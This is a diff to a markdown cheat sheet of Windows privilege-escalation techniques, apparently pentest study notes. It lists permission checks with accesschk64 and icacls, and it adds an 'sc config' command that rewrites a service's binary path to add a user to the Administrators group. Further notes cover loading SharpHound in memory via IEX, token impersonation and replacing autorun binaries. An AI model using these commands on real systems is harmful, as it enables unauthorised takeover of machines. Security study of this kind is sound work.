@@ -11,14 +11,17 @@
 | ```accesschk64.exe -wvu <file.exe>``` | This will check the files access writes |
 | ```icacls.exe <filename.txt>``` | Does the same thing as accesschk64.exe but is native to OS |
 | ```accesschk64.exe -uwcv Everyone *``` | Searches the file system for world-writeable service binaries |
-| ```accesschk64.exe -uwcv <name_of_service>``` | Once you identify a service, get more detail by searching for the single service name |
-
+| ```accesschk64.exe -uwcv <service name>``` | Once you identify a service, get more detail by searching for the single service name |
+| ```sc query <service name>``` | We can gather the binmary path name by using the sc query command
+| ```sc config <service name> binpath= "net localgroup administrators <username> /add"``` | Modify binpath |
+ 
 | Check | Description |
 | ---------------------------- | ---------------------------- |
 | PowerShell IWR vs IEX | Be sure to remember IEX will run the script in memory, useful for loading SharpHound.ps1 remotely |
 | What tokens are on machine | If there tokens on the machine, you may be able to switch into that user, and elevate privileges |
 | Check for autoruns | These are programs that can run with elevated permissions. If they have execissive permssions (EVERYONE) you can replace the binary and elevate access |
 | Check for Binary Path issues| See command above, its important that we can restart these services to affect them |
+| If Binary Path has issue | We can modify the path to our malicious payload, add your self to Administrators group, or use other techniques |
 
 ## Common Location for WSL.exe
 ```
